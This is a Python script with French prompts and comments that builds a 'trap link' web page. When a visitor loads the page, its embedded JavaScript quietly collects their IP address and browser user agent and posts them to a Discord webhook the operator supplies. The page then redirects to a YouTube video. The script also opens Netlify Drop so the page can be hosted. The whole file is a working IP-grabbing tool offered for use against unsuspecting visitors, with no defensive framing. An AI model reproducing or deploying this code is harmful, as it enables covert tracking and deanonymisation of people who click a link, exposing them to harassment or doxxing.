import os
import webbrowser

# Couleurs pour le style
red, white, green, reset = "\033[91m", "\033[97m", "\033[92m", "\033[0m"

def Clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Main():
    Clear()
    print(f"{red}╔════════════════════════════════════════╗")
    print(f"║      {white}GENERATEUR DE LIEN PIÈGE{red}          ║")
    print(f"╚════════════════════════════════════════╝{reset}\n")
    
    # 1. On demande ton Webhook Discord
    webhook = input(f"{red}[input]{white} Colle ton Webhook Discord ici -> {reset}").strip()
    
    if "discord.com" not in webhook:
        print(f"\n{red}[!] Erreur : Lien Webhook invalide.{reset}")
        return

    # 2. Le lien vers ta vidéo YouTube
    youtube_link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1"

    # 3. Création automatique du code HTML
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Chargement...</title>
    <script>
        async function capture() {{
            try {{
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                await fetch('{webhook}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        embeds: [{{
                            title: "🚀 Clic sur le lien détecté !",
                            color: 15158332,
                            fields: [
                                {{ name: "🌐 IP", value: data.ip }},
                                {{ name: "📱 Info", value: navigator.userAgent }}
                            ],
                            timestamp: new Date().toISOString()
                        }}]
                    }})
                }});
            }} catch (e) {{}}
            window.location.href = "{youtube_link}";
        }}
        window.onload = capture;
    </script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
    <p>Redirection en cours...</p>
</body>
</html>"""

    # 4. Sauvegarde automatique
    # On crée un dossier 'site_piege' pour que tu puisses le glisser sur Netlify
    if not os.path.exists('site_piege'):
        os.makedirs('site_piege')
        
    with open("site_piege/index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    print(f"\n{green}[+]{white} RÉUSSI : Le fichier 'index.html' est dans le dossier 'site_piege'.")
    print(f"{red}[*]{white} Je vais ouvrir Netlify Drop pour toi.")
    print(f"{red}[*]{white} GLISSE le dossier 'site_piege' sur la page.{reset}")
    
    input(f"\n{green}Appuie sur Entrée pour finir...{reset}")
    webbrowser.open("https://app.netlify.com/drop")

if __name__ == "__main__":
    Main()